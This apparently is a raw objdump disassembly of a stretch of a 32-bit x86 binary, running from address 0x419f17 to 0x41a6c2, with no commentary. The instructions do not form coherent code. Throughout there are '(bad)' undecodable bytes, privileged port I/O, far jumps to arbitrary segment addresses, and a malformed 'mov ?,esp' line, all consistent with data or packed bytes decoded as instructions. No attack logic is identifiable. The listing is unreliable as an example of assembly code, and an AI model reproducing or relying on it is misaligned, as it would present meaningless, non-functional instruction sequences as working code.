  419f17:	sub    al,0xaf
  419f19:	pop    ebp
  419f1a:	jmp    0xf93a12e
  419f1f:	sbb    al,0x55
  419f21:	mov    esi,0x46a96980
  419f26:	mov    al,ds:0x3e6c8ddc
  419f2b:	retf   0xbfdf
  419f2e:	sub    BYTE PTR [ebx],ch
  419f30:	mov    WORD PTR [eax-0x14951a05],es
  419f36:	out    dx,eax
  419f37:	xor    BYTE PTR [ecx],dh
  419f39:	push   es
  419f3a:	pop    esi
  419f3b:	dec    ecx
  419f3c:	xor    al,0x11
  419f3e:	jle    0x419f62
  419f40:	adc    ah,BYTE PTR [ebp-0x793ec1c0]
  419f46:	mov    esp,0xc412f7c3
  419f4b:	stos   DWORD PTR es:[edi],eax
  419f4c:	pop    esi
  419f4d:	aam    0xb2
  419f4f:	gs adc eax,0xa9ff2206
  419f55:	lds    ebp,FWORD PTR [ebx]
  419f57:	add    eax,0x75ce10f9
  419f5c:	mov    eax,0xfd283a0c
  419f61:	out    0xa0,al
  419f63:	rol    DWORD PTR [ecx-0x32e6453f],1
  419f69:	xor    BYTE PTR [ebx],dl
  419f6b:	cdq    
  419f6c:	cwde   
  419f6d:	xchg   ecx,eax
  419f6e:	outs   dx,BYTE PTR ds:[esi]
  419f6f:	mov    eax,0xe27bfa7a
  419f74:	cs push ebp
  419f76:	cld    
  419f77:	test   BYTE PTR [esp+eiz*8-0x3d],dl
  419f7b:	mov    esp,0x56eb1362
  419f80:	mov    ebx,0x4b091da1
  419f85:	out    0x99,eax
  419f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f88:	retf   0x9ede
  419f8b:	mov    WORD PTR [edx-0x58],cs
  419f8e:	popa   
  419f8f:	cwde   
  419f90:	dec    ebx
  419f91:	push   ss
  419f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f93:	xlat   BYTE PTR ds:[ebx]
  419f94:	dec    ebp
  419f95:	inc    eax
  419f96:	jl     0x419f5f
  419f98:	cmp    al,0xee
  419f9a:	stc    
  419f9b:	jae    0x419fc7
  419f9d:	push   es
  419f9e:	ins    DWORD PTR es:[edi],dx
  419f9f:	push   eax
  419fa0:	rol    BYTE PTR [esi+edx*2-0xb],0x77
  419fa5:	scas   eax,DWORD PTR es:[edi]
  419fa6:	aaa    
  419fa7:	icebp  
  419fa8:	(bad)  
  419faa:	ja     0x419f85
  419fac:	or     bl,dh
  419fae:	lock out 0xa1,eax
  419fb1:	mov    ebp,DWORD PTR [edi+0x74]
  419fb4:	pop    ebx
  419fb5:	ds clc 
  419fb7:	sub    bl,bh
  419fb9:	pop    ebp
  419fba:	mov    bl,0xa2
  419fbc:	les    ebx,FWORD PTR [ebx+ebp*4+0xa61a79d]
  419fc3:	dec    ecx
  419fc4:	mov    esi,0xd17f6612
  419fc9:	lahf   
  419fca:	or     dh,cl
  419fcc:	in     eax,0xab
  419fce:	pop    ss
  419fcf:	fmul   DWORD PTR [edx-0x2a]
  419fd2:	and    BYTE PTR [esi-0x4e],cl
  419fd5:	lods   eax,DWORD PTR ds:[esi]
  419fd6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd8:	sub    dl,BYTE PTR [ebx-0x74d70388]
  419fde:	cs jbe 0x41a04a
  419fe1:	popa   
  419fe2:	mov    fs,WORD PTR [esp+eax*4+0x26]
  419fe6:	cmp    eax,0x4551f806
  419feb:	daa    
  419fec:	jmp    0x3c6ebfea
  419ff1:	sbb    al,0xcd
  419ff3:	xor    eax,0xbea8d6ae
  419ff8:	daa    
  419ff9:	lea    ecx,[edx-0x1]
  419ffc:	jb     0x41a050
  419ffe:	sub    bl,BYTE PTR [esi-0x79307956]
  41a004:	add    DWORD PTR [edi+edx*8-0x22],eax
  41a008:	inc    ecx
  41a009:	jp     0x419fa6
  41a00b:	push   ds
  41a00c:	ret    
  41a00d:	xlat   BYTE PTR ds:[ebx]
  41a00e:	fdiv   st(4),st
  41a010:	jecxz  0x419fff
  41a012:	popf   
  41a013:	inc    esp
  41a014:	mov    dh,0xbc
  41a016:	aad    0xc1
  41a018:	sub    cl,BYTE PTR [eax+ebp*4+0x4828b2ee]
  41a01f:	ret    
  41a020:	dec    eax
  41a021:	jmp    0xbb0c:0xde706938
  41a028:	pop    ss
  41a029:	js     0x419fad
  41a02b:	xor    al,0x39
  41a02d:	fdiv   DWORD PTR [ecx-0x31]
  41a030:	test   al,0x56
  41a032:	xchg   bh,dl
  41a034:	pop    es
  41a035:	(bad)  
  41a036:	ficom  DWORD PTR [ebx]
  41a038:	jne    0x41a040
  41a03a:	pop    ecx
  41a03b:	dec    edx
  41a03c:	pop    edx
  41a03d:	stos   BYTE PTR es:[edi],al
  41a03e:	pop    eax
  41a03f:	push   0xffffff83
  41a041:	(bad)  
  41a043:	sub    edx,ecx
  41a045:	push   edx
  41a046:	enter  0xfa9c,0x7
  41a04a:	mov    eax,0x3eda4012
  41a04f:	xor    al,0x54
  41a051:	mov    ecx,0x2043d6d5
  41a056:	cwde   
  41a057:	adc    DWORD PTR [ecx+0xd],ebx
  41a05a:	imul   ebp,DWORD PTR [edx+0x6c4e8acf],0x1c
  41a061:	rcl    BYTE PTR [ebx],cl
  41a063:	mov    dh,0x9e
  41a065:	xchg   ebp,eax
  41a066:	dec    edx
  41a067:	jmp    0x73625147
  41a06c:	pop    es
  41a06d:	or     al,BYTE PTR [eax+0x3cc6d30c]
  41a073:	pop    ebp
  41a074:	pop    ds
  41a075:	leave  
  41a076:	(bad)  
  41a077:	rcr    BYTE PTR [eax],1
  41a079:	push   cs
  41a07a:	pop    es
  41a07b:	rcr    ecx,1
  41a07d:	(bad)  
  41a07e:	les    ecx,FWORD PTR [ebx]
  41a080:	dec    esi
  41a081:	pop    esi
  41a082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a083:	dec    esp
  41a084:	test   DWORD PTR [ebp-0x25],ebx
  41a087:	push   esi
  41a088:	ret    0x736f
  41a08b:	outs   dx,DWORD PTR ds:[esi]
  41a08c:	cmp    eax,DWORD PTR [edx-0x65b881c1]
  41a092:	rcl    BYTE PTR ds:0x9be1e1c3,1
  41a098:	cmp    BYTE PTR [ecx+0x53cf479],bl
  41a09e:	cmp    esi,DWORD PTR [edi+0x710c6fe9]
  41a0a4:	iret   
  41a0a5:	stos   DWORD PTR es:[edi],eax
  41a0a6:	push   es
  41a0a7:	stc    
  41a0a8:	inc    ebp
  41a0a9:	adc    al,0x5f
  41a0ab:	(bad)  
  41a0ac:	jg     0x41a096
  41a0ae:	push   edx
  41a0af:	shr    DWORD PTR [edi],cl
  41a0b1:	fwait
  41a0b2:	xor    eax,0xcc57d47b
  41a0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0b8:	ins    DWORD PTR es:[edi],dx
  41a0b9:	out    0x20,eax
  41a0bb:	sbb    ch,dh
  41a0bd:	(bad)  
  41a0be:	push   edx
  41a0bf:	mov    al,0x89
  41a0c1:	cli    
  41a0c2:	pop    esp
  41a0c3:	mov    esp,0xef1f548f
  41a0c8:	imul   ebp,DWORD PTR [esi+edx*1-0x385330ed],0x9bf1d4e6
  41a0d3:	lock sbb ah,BYTE PTR [si+0x4f]
  41a0d8:	out    dx,eax
  41a0d9:	cmp    eax,0x573a6bd7
  41a0de:	fcomp  QWORD PTR [ecx]
  41a0e0:	adc    esi,DWORD PTR [ecx]
  41a0e2:	or     eax,0x898d5637
  41a0e7:	js     0x41a123
  41a0e9:	aam    0x62
  41a0eb:	clc    
  41a0ec:	clc    
  41a0ed:	pop    es
  41a0ee:	mov    al,BYTE PTR [ebx+0x24559eca]
  41a0f4:	inc    edx
  41a0f5:	icebp  
  41a0f6:	mov    ecx,0xc2cd1c23
  41a0fb:	call   0xf209:0x2dff5f72
  41a102:	call   0x5727:0x3fe9d56f
  41a109:	jb     0x41a117
  41a10b:	pop    ss
  41a10c:	call   0x6eb090d2
  41a111:	mov    dl,0xd
  41a113:	jp     0x41a17d
  41a115:	aad    0x7
  41a117:	xor    BYTE PTR [ecx-0x55],ah
  41a11a:	jae    0x41a0d8
  41a11c:	outs   dx,BYTE PTR ds:[esi]
  41a11d:	xchg   ebp,eax
  41a11e:	dec    ebx
  41a11f:	pop    ecx
  41a120:	push   esp
  41a121:	fist   WORD PTR [eax+0x42093567]
  41a127:	lods   eax,DWORD PTR ds:[esi]
  41a128:	or     al,0x5b
  41a12a:	mov    dl,0xd5
  41a12c:	or     DWORD PTR [esi+0x7a],ebx
  41a12f:	hlt    
  41a130:	rcr    DWORD PTR [ebp-0x3241a741],0x79
  41a137:	(bad)  
  41a138:	fsubr  QWORD PTR [ebp-0x4]
  41a13b:	lods   al,BYTE PTR ds:[esi]
  41a13c:	sbb    DWORD PTR [eax+0x72],0xffffffc0
  41a140:	xchg   BYTE PTR [ebx],ah
  41a142:	inc    ebp
  41a143:	mov    eax,ds:0xde7ba977
  41a148:	inc    esp
  41a149:	push   0x1e
  41a14b:	xor    eax,0xdf788b37
  41a150:	test   al,0xd2
  41a152:	rcr    BYTE PTR [ebp+0x2fb8684b],cl
  41a158:	inc    ebx
  41a159:	test   DWORD PTR [ebx],0x33a2b150
  41a15f:	mov    edi,0x492b23dc
  41a164:	in     eax,0xea
  41a166:	add    dh,BYTE PTR [edi+eax*2-0x10b7f148]
  41a16d:	pop    edi
  41a16e:	mov    dh,0x22
  41a170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a171:	push   ds
  41a172:	aas    
  41a173:	aaa    
  41a174:	neg    ch
  41a176:	popf   
  41a177:	stos   BYTE PTR es:[edi],al
  41a178:	dec    edx
  41a179:	sub    ebp,ebx
  41a17b:	pop    es
  41a17c:	mov    cx,0x6501
  41a180:	inc    ebx
  41a181:	mov    ch,0x3f
  41a183:	stos   BYTE PTR es:[edi],al
  41a184:	ret    0x3e09
  41a187:	ss pop eax
  41a189:	hlt    
  41a18a:	aaa    
  41a18b:	xchg   edx,eax
  41a18c:	mov    ecx,0xcde3375f
  41a191:	mov    al,ds:0xf59899e0
  41a196:	or     DWORD PTR [eax+esi*2-0x26ccba48],ebp
  41a19d:	push   0xcfc8174f
  41a1a2:	rol    BYTE PTR [esp+ebx*4-0x11],1
  41a1a6:	loop   0x41a19a
  41a1a8:	or     dl,BYTE PTR [ebx+0x10f29761]
  41a1ae:	sbb    al,0x16
  41a1b0:	mov    edi,0xbca0517
  41a1b5:	ret    
  41a1b6:	mov    dh,0x58
  41a1b8:	(bad)  
  41a1b9:	push   edx
  41a1ba:	inc    ecx
  41a1bb:	cmc    
  41a1bc:	fucomi st,st(6)
  41a1be:	jmp    0xb85e19a2
  41a1c3:	jle    0x41a1c9
  41a1c5:	xchg   esi,eax
  41a1c6:	in     al,0x86
  41a1c8:	pop    es
  41a1c9:	sub    esi,DWORD PTR [ecx+0x16]
  41a1cc:	or     al,0x61
  41a1ce:	jg     0x41a200
  41a1d0:	add    ch,BYTE PTR [esi-0x2]
  41a1d3:	mov    edx,0x3fd03ab7
  41a1d8:	xchg   ebx,eax
  41a1d9:	rol    BYTE PTR [ebp-0x5b],1
  41a1dc:	outs   dx,DWORD PTR ds:[esi]
  41a1dd:	fistp  WORD PTR [ebx-0x58]
  41a1e0:	xor    ecx,edi
  41a1e2:	fwait
  41a1e3:	push   cs
  41a1e4:	adc    edx,eax
  41a1e6:	loope  0x41a209
  41a1e8:	sti    
  41a1e9:	push   DWORD PTR [eax+0x70]
  41a1ec:	sar    edi,1
  41a1ee:	(bad)  
  41a1f0:	loop   0x41a180
  41a1f2:	ins    DWORD PTR es:[edi],dx
  41a1f3:	mov    eax,0xa6c518d8
  41a1f8:	sbb    esi,DWORD PTR [edi+edi*1-0x6636d5dd]
  41a1ff:	(bad)  
  41a200:	and    DWORD PTR [eax-0x63d77c24],eax
  41a206:	movsx  edi,bx
  41a209:	adc    al,BYTE PTR [eax]
  41a20b:	inc    esp
  41a20c:	or     al,BYTE PTR [edx]
  41a20e:	mov    bl,0x18
  41a210:	adc    edi,DWORD PTR [ebp+0x56]
  41a213:	push   es
  41a214:	mov    ebp,0x4f4918b2
  41a219:	psrlq  mm0,QWORD PTR [edx-0x2a]
  41a21d:	cmp    BYTE PTR ds:0x1f8ceba7,ah
  41a223:	rcr    al,1
  41a225:	jmp    0x41a2a6
  41a227:	xor    DWORD PTR [edi+0x857e4bb],ecx
  41a22d:	or     DWORD PTR [edi+0x61],esi
  41a230:	or     BYTE PTR [ecx+edi*4-0x33472948],0x4a
  41a238:	fs xchg ebx,eax
  41a23a:	add    dh,BYTE PTR [edx]
  41a23c:	rcl    BYTE PTR [ebp+0x18],0xa5
  41a240:	imul   edi,DWORD PTR [edx+0x64ee211e],0xcbefb71c
  41a24a:	mov    DWORD PTR [esp+edi*8],0xa8a4132f
  41a251:	or     ebp,0xffffff8c
  41a254:	and    bh,ah
  41a256:	aad    0x72
  41a258:	push   edx
  41a259:	add    BYTE PTR [edi-0x5c],bl
  41a25c:	lahf   
  41a25d:	mov    esi,0x26dda9bb
  41a262:	addr16 push edi
  41a264:	fsubr  st,st(5)
  41a266:	push   ss
  41a267:	rep stos BYTE PTR es:[edi],al
  41a269:	mov    ebp,0xf15a3f20
  41a26e:	mov    esp,0xba592063
  41a273:	sbb    ebp,edi
  41a275:	scas   eax,DWORD PTR es:[edi]
  41a276:	rcl    BYTE PTR [ecx+0x68],cl
  41a279:	or     DWORD PTR [edx],ebp
  41a27b:	pop    ds
  41a27c:	fidivr DWORD PTR [ecx+0x23]
  41a27f:	cmp    eax,DWORD PTR [esi]
  41a281:	push   ecx
  41a282:	push   ds
  41a283:	(bad)  
  41a284:	xchg   esp,eax
  41a285:	rcl    BYTE PTR [edx+0xcc7ebf2],0xc
  41a28c:	fxch   st(0)
  41a28e:	out    dx,al
  41a28f:	mov    eax,ds:0x313671df
  41a294:	sbb    BYTE PTR [edx-0x67],al
  41a297:	add    eax,0x50f5ad78
  41a29c:	frstor [ebp+0x26]
  41a29f:	rcr    BYTE PTR [si+0x54c5],0x8e
  41a2a5:	sub    eax,0x37c536bb
  41a2aa:	or     al,0xd7
  41a2ac:	loop   0x41a291
  41a2ae:	ret    
  41a2af:	call   0xd0b13562
  41a2b4:	jmp    0x41a2ae
  41a2b6:	inc    ecx
  41a2b7:	mov    ebx,0xb897845f
  41a2bc:	mov    al,0x2a
  41a2be:	out    0x56,eax
  41a2c0:	xchg   ebp,eax
  41a2c1:	(bad)  
  41a2c3:	push   ds
  41a2c4:	jnp    0x41a337
  41a2c6:	mov    BYTE PTR [ecx+0x64],al
  41a2c9:	stc    
  41a2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2cb:	xor    al,0x97
  41a2cd:	es into 
  41a2cf:	bnd jbe 0x41a2c8
  41a2d2:	push   0xffffffde
  41a2d4:	xchg   edx,eax
  41a2d5:	mov    DWORD PTR [ecx+0x2105b2c8],ebp
  41a2db:	scas   al,BYTE PTR es:[edi]
  41a2dc:	inc    edi
  41a2dd:	cdq    
  41a2de:	jno    0x41a2c3
  41a2e0:	je     0x41a2c3
  41a2e2:	pop    es
  41a2e3:	and    BYTE PTR [esi-0x3b],ah
  41a2e6:	pop    edi
  41a2e7:	test   DWORD PTR [ebx],edi
  41a2e9:	gs sub eax,0x7d6f03a
  41a2ef:	adc    al,0x3b
  41a2f1:	gs push ds
  41a2f3:	leave  
  41a2f4:	std    
  41a2f5:	cmc    
  41a2f6:	dec    edi
  41a2f7:	pop    ebp
  41a2f8:	arpl   WORD PTR [eax],ax
  41a2fa:	inc    eax
  41a2fb:	test   al,0xbd
  41a2fd:	arpl   WORD PTR ds:0x2ed8624b,bx
  41a303:	mov    esi,0xd7903232
  41a308:	dec    ecx
  41a309:	hlt    
  41a30a:	frstor [ecx+ebp*4+0x626f8bf7]
  41a311:	mov    edi,0xedd9abc0
  41a316:	fisub  WORD PTR [edx+eax*4-0x5a]
  41a31a:	and    ebp,DWORD PTR [ecx-0x55db3e84]
  41a320:	fld    TBYTE PTR [eax+0x87bc78d]
  41a326:	test   BYTE PTR [edx+0x44027187],ch
  41a32c:	setns  BYTE PTR [esi]
  41a32f:	mov    edi,0x87cea2fa
  41a334:	(bad)  
  41a335:	mov    ebp,0xaf305860
  41a33a:	xor    edx,DWORD PTR [eax]
  41a33c:	aam    0xbd
  41a33e:	aaa    
  41a33f:	dec    eax
  41a340:	mov    es,WORD PTR [eax]
  41a342:	ss in  al,0xd5
  41a345:	adc    al,0xa9
  41a347:	sbb    al,0x49
  41a349:	aaa    
  41a34a:	xor    ah,ah
  41a34c:	sbb    eax,0xf45b0c28
  41a351:	jmp    0x1c6a9a0
  41a356:	pop    edx
  41a357:	sub    eax,0x12585e5d
  41a35c:	dec    edx
  41a35d:	daa    
  41a35e:	xchg   edi,eax
  41a35f:	sub    edi,DWORD PTR [ecx+0x24]
  41a362:	shl    DWORD PTR [esi+ecx*1-0x1a],cl
  41a366:	stc    
  41a367:	mov    BYTE PTR [esi-0x54d014fb],dl
  41a36d:	push   es
  41a36e:	xchg   ebx,eax
  41a36f:	add    DWORD PTR [ecx+0x4ccae609],ebp
  41a375:	popa   
  41a376:	and    BYTE PTR [ebp-0x53b211eb],bh
  41a37c:	leave  
  41a37d:	repz and eax,0x85f44d50
  41a383:	retf   0xe2ee
  41a386:	mov    BYTE PTR [esi],ah
  41a388:	in     al,dx
  41a389:	or     al,0xb5
  41a38b:	pop    ebx
  41a38c:	pop    ds
  41a38d:	ret    0x1f0
  41a390:	out    0xe3,eax
  41a392:	xchg   ebx,eax
  41a393:	bound  ecx,QWORD PTR [edx*8+0x633f9c84]
  41a39a:	dec    esi
  41a39b:	push   ecx
  41a39c:	call   0x1b580a1
  41a3a1:	shr    BYTE PTR [esp+edx*1+0x4a],cl
  41a3a5:	mov    ch,0x6e
  41a3a7:	adc    eax,0x33d837a9
  41a3ac:	or     BYTE PTR [edi-0x5016f34c],al
  41a3b2:	pop    ebx
  41a3b3:	outs   dx,BYTE PTR ds:[esi]
  41a3b4:	inc    esp
  41a3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b6:	fist   DWORD PTR [ebx-0x339ba82b]
  41a3bc:	pusha  
  41a3bd:	cmp    eax,0x3cd0ff3b
  41a3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3c3:	mov    esi,0x12f4bcac
  41a3c8:	pop    ecx
  41a3c9:	arpl   sp,di
  41a3cb:	stos   BYTE PTR es:[edi],al
  41a3cc:	xor    DWORD PTR [eax-0x3a82e83f],edi
  41a3d2:	call   0xaac8:0xd45ba329
  41a3d9:	mov    ebx,cs
  41a3db:	retf   
  41a3dc:	ret    
  41a3dd:	mov    ebx,0x11e79d6e
  41a3e2:	jmp    0xa80c8028
  41a3e7:	jg     0x41a42c
  41a3e9:	cwde   
  41a3ea:	jnp    0x41a385
  41a3ec:	mov    ah,0x4f
  41a3ee:	and    BYTE PTR [edx+0xb],bl
  41a3f1:	mov    ecx,ecx
  41a3f3:	pushf  
  41a3f4:	dec    esi
  41a3f5:	add    cl,dl
  41a3f7:	adc    BYTE PTR [edi+0x1acd26dc],ch
  41a3fd:	ss enter 0x48ee,0xbf
  41a402:	fiadd  DWORD PTR [edi+0x2ef076a6]
  41a409:	repz or edx,DWORD PTR [ebp+0x6f]
  41a40d:	inc    edi
  41a40e:	dec    ecx
  41a40f:	push   edx
  41a410:	sahf   
  41a411:	pushf  
  41a412:	ins    DWORD PTR es:[edi],dx
  41a413:	push   ss
  41a414:	mov    esp,0x95633674
  41a419:	iret   
  41a41a:	push   ecx
  41a41b:	adc    ebp,ecx
  41a41d:	and    al,0xe0
  41a41f:	leave  
  41a420:	push   0x49
  41a422:	sbb    BYTE PTR [esi],0xe0
  41a425:	cmp    DWORD PTR [ecx+0x3b],esp
  41a428:	cmc    
  41a429:	std    
  41a42a:	or     ecx,edi
  41a42c:	or     eax,0xf6da5e44
  41a431:	dec    ebx
  41a432:	test   al,0xc7
  41a434:	mov    DWORD PTR [ecx+edi*1+0x71ce1e33],ecx
  41a43b:	clc    
  41a43c:	out    dx,eax
  41a43d:	push   eax
  41a43e:	adc    dh,BYTE PTR [ebx-0x14a48b9b]
  41a444:	xchg   ecx,eax
  41a445:	mov    ecx,0xd15bb6e5
  41a44a:	int3   
  41a44b:	mov    ?,esp
  41a44d:	inc    edi
  41a44e:	outs   dx,DWORD PTR ds:[esi]
  41a44f:	cld    
  41a450:	push   ds
  41a451:	or     dh,BYTE PTR [ebp+0x7b]
  41a454:	in     al,dx
  41a455:	lods   al,BYTE PTR ds:[esi]
  41a456:	stos   BYTE PTR es:[edi],al
  41a457:	retf   
  41a458:	mov    WORD PTR [eax+edx*8],fs
  41a45b:	adc    al,0x82
  41a45d:	jno    0x41a484
  41a45f:	arpl   WORD PTR [eax+0xa],di
  41a462:	mov    dl,0x66
  41a464:	mov    BYTE PTR [esi-0x12ae3367],ch
  41a46a:	cld    
  41a46b:	(bad)  
  41a46c:	sbb    DWORD PTR [edi],ebp
  41a46e:	cmp    bl,BYTE PTR [edx-0x2b]
  41a471:	mov    BYTE PTR [ebp+0x58],dl
  41a474:	xchg   ebx,eax
  41a475:	xor    eax,0x38fe7c19
  41a47a:	xchg   edi,eax
  41a47b:	push   ds
  41a47c:	test   DWORD PTR [esi-0x4164342c],ebx
  41a482:	or     DWORD PTR [edi],esi
  41a484:	sbb    eax,0x84319881
  41a489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48a:	jmp    0x41a46f
  41a48c:	lods   eax,DWORD PTR ds:[esi]
  41a48d:	lea    edi,[edi]
  41a48f:	adc    eax,0x46ebe2c9
  41a494:	jae    0x41a4e3
  41a496:	cmp    eax,DWORD PTR [ecx+esi*8]
  41a499:	add    BYTE PTR [edx-0x3c8b2d50],ch
  41a49f:	ins    DWORD PTR es:[edi],dx
  41a4a0:	push   eax
  41a4a1:	out    0x64,eax
  41a4a3:	fidivr WORD PTR [edx+0x500bfdbc]
  41a4a9:	sub    BYTE PTR [edi],0xf3
  41a4ac:	add    esp,edi
  41a4ae:	and    eax,DWORD PTR [ebx+0x1a]
  41a4b1:	and    BYTE PTR [esi-0x4e463add],dh
  41a4b7:	stos   BYTE PTR es:[edi],al
  41a4b8:	or     DWORD PTR [ecx],eax
  41a4ba:	adc    BYTE PTR [edi+ecx*4-0x4c],dl
  41a4be:	leave  
  41a4bf:	sub    al,BYTE PTR [esp+eax*2]
  41a4c2:	xchg   ah,ah
  41a4c4:	shl    eax,0xb9
  41a4c7:	inc    edi
  41a4c8:	mov    ebp,0x9d15d135
  41a4cd:	daa    
  41a4ce:	daa    
  41a4cf:	dec    ecx
  41a4d0:	(bad)  
  41a4d1:	and    al,BYTE PTR [ebx-0x27e6182c]
  41a4d7:	jo     0x41a50c
  41a4d9:	mov    BYTE PTR [edx+0x8],bh
  41a4dc:	daa    
  41a4dd:	call   0x694ab128
  41a4e2:	or     eax,0x217ee3e3
  41a4e8:	sbb    DWORD PTR [ecx],0xcd714165
  41a4ee:	and    eax,0x5ea16ce2
  41a4f3:	or     ch,BYTE PTR [esp+ecx*2+0x6b41c7f5]
  41a4fa:	jecxz  0x41a516
  41a4fc:	and    BYTE PTR [ecx-0x5434018],dl
  41a502:	call   0x67cfe44
  41a507:	add    DWORD PTR [ebx-0x7b],ebx
  41a50a:	xchg   BYTE PTR [ebx+edi*1-0xf],al
  41a50e:	lea    ecx,[eax+0x74b07fe1]
  41a514:	ds out dx,eax
  41a516:	sbb    DWORD PTR [ecx],ebx
  41a518:	inc    ebx
  41a519:	scas   eax,DWORD PTR es:[edi]
  41a51a:	jno    0x41a51c
  41a51c:	xchg   ebp,eax
  41a51d:	mov    DWORD PTR [eax+0x4540ff74],edi
  41a523:	dec    BYTE PTR [ecx+ebp*2-0x76c167d3]
  41a52a:	jl     0x41a573
  41a52c:	ins    DWORD PTR es:[edi],dx
  41a52d:	imul   eax,DWORD PTR [esi+0x10402cf3],0x3e
  41a534:	pop    esp
  41a535:	xchg   edx,eax
  41a536:	and    eax,DWORD PTR [esi]
  41a538:	mov    al,ds:0xd406d29
  41a53d:	imul   esi,DWORD PTR ds:0x63c8be09,0xffffff8e
  41a544:	stc    
  41a545:	js     0x41a4e3
  41a547:	jbe    0x41a595
  41a549:	mov    edx,0xa43d21f5
  41a54e:	idiv   esp
  41a550:	sbb    DWORD PTR ds:0x3a78371f,ecx
  41a556:	jmp    0x41a5c8
  41a558:	mov    al,ds:0x77b2307b
  41a55d:	mov    ebp,0xccb6ef3f
  41a562:	(bad)  
  41a563:	inc    ecx
  41a564:	out    dx,eax
  41a565:	repz dec eax
  41a567:	loope  0x41a5ae
  41a569:	lahf   
  41a56a:	lds    esp,FWORD PTR [ecx]
  41a56c:	lds    eax,FWORD PTR [eax]
  41a56e:	mov    edx,edx
  41a570:	xor    DWORD PTR [ecx+0x5b55bec5],edi
  41a576:	fwait
  41a577:	mov    al,ds:0xf284eb5d
  41a57c:	iret   
  41a57d:	xchg   esp,eax
  41a57e:	rcr    BYTE PTR [esi+esi*1],0xda
  41a582:	sbb    al,0xd8
  41a584:	sahf   
  41a585:	or     bl,dh
  41a587:	mov    eax,0xfb126f80
  41a58c:	loopne 0x41a5f8
  41a58e:	je     0x41a580
  41a590:	sbb    DWORD PTR [ebx],edi
  41a592:	add    eax,0x51ad0e31
  41a597:	mov    eax,0x13b53a66
  41a59c:	test   ebx,ebx
  41a59e:	repz aam 0x45
  41a5a1:	push   eax
  41a5a2:	(bad)  
  41a5a3:	push   ebp
  41a5a4:	aaa    
  41a5a5:	dec    eax
  41a5a6:	mov    dl,al
  41a5a8:	mov    esp,0x7c1645ed
  41a5ad:	pop    es
  41a5ae:	enter  0x1fac,0xb4
  41a5b2:	add    DWORD PTR [esi+ebx*1],ebx
  41a5b5:	cmp    ecx,DWORD PTR [ecx-0x76]
  41a5b8:	fld    TBYTE PTR [esi-0x5d34f942]
  41a5be:	lds    esi,FWORD PTR [ecx-0x42a1a79a]
  41a5c4:	fistp  DWORD PTR [ebx-0x21310580]
  41a5ca:	call   0xfcf1:0xa04c975
  41a5d1:	mov    al,ds:0xb44e7b65
  41a5d6:	aaa    
  41a5d7:	inc    esi
  41a5d8:	fmul   DWORD PTR [ebp+0x38f3ced7]
  41a5de:	add    al,0x8e
  41a5e0:	push   ds
  41a5e1:	gs stc 
  41a5e3:	jecxz  0x41a582
  41a5e5:	das    
  41a5e6:	loope  0x41a5fc
  41a5e8:	mov    DWORD PTR [ecx-0x3ad5e4ad],eax
  41a5ee:	mov    BYTE PTR [edi-0x75],ah
  41a5f1:	outs   dx,BYTE PTR ds:[esi]
  41a5f2:	out    0xb5,al
  41a5f4:	dec    edi
  41a5f5:	mov    ds:0xa7be0b6,eax
  41a5fa:	push   cs
  41a5fb:	scas   eax,DWORD PTR es:[edi]
  41a5fc:	pop    ecx
  41a5fd:	sbb    eax,0xeec39fa1
  41a602:	add    bl,bh
  41a604:	cli    
  41a605:	mov    bl,BYTE PTR [esi]
  41a607:	ror    BYTE PTR [esp+esi*4+0x6d2b3f2d],1
  41a60e:	iret   
  41a60f:	sub    dl,BYTE PTR [ebx]
  41a611:	bswap  ebx
  41a613:	sub    eax,0xfc5a209a
  41a618:	popf   
  41a619:	or     al,0x71
  41a61b:	xor    DWORD PTR [eax],edx
  41a61d:	xchg   esi,eax
  41a61e:	push   eax
  41a61f:	dec    ebx
  41a620:	push   0xa3919376
  41a625:	mov    dh,0x14
  41a627:	cs inc ebp
  41a629:	loope  0x41a675
  41a62b:	cld    
  41a62c:	pop    edx
  41a62d:	jmp    0x32d1:0xfd23979e
  41a634:	aam    0x4a
  41a636:	adc    al,0x72
  41a638:	psrlw  mm4,QWORD PTR [esi-0x510b519e]
  41a63f:	dec    ecx
  41a640:	nop
  41a641:	dec    edx
  41a642:	inc    edi
  41a643:	(bad)  
  41a644:	stc    
  41a645:	pop    ss
  41a646:	or     al,0xa2
  41a648:	(bad)  
  41a649:	and    bl,BYTE PTR [ecx+ebp*2]
  41a64c:	fsub   DWORD PTR [edi-0x37e21a8d]
  41a652:	ficomp WORD PTR [ebp+edi*4+0x6296bab6]
  41a659:	sbb    eax,0x31422790
  41a65e:	dec    ebp
  41a65f:	or     si,WORD PTR [edi-0x44]
  41a663:	mov    BYTE PTR [edx-0x2d],cl
  41a666:	fnstsw WORD PTR [edi]
  41a668:	add    eax,0x6ffef572
  41a66d:	ret    0x5496
  41a670:	test   BYTE PTR [ebx+ebp*1-0x6d],al
  41a674:	ds push edx
  41a676:	pop    edi
  41a677:	dec    edi
  41a678:	adc    DWORD PTR [edx+0x40],edx
  41a67b:	mov    dh,0x84
  41a67d:	lahf   
  41a67e:	or     al,BYTE PTR ds:0xb88c7777
  41a684:	mov    ds:0x863fd5db,eax
  41a689:	(bad)  
  41a68a:	lds    ebx,FWORD PTR [edx]
  41a68c:	sub    eax,0x870740cb
  41a691:	fnstenv [esi-0x31affb10]
  41a697:	not    BYTE PTR [ebx+0x4b]
  41a69a:	inc    esp
  41a69b:	jnp    0x41a71b
  41a69d:	ret    
  41a69e:	sbb    eax,0xa094f4e3
  41a6a3:	mov    al,0x26
  41a6a5:	loop   0x41a699
  41a6a7:	add    edx,DWORD PTR [edx+0x2045d6c8]
  41a6ad:	sub    esi,ecx
  41a6af:	out    0x80,al
  41a6b1:	fisubr WORD PTR [ebx-0x49]
  41a6b4:	das    
  41a6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6b6:	jmp    0xef42:0xc6b758aa
  41a6bd:	mov    ds:0xf7356e6d,eax
  41a6c2:	sbb    BYTE PTR [ebp+0x377a3771],al
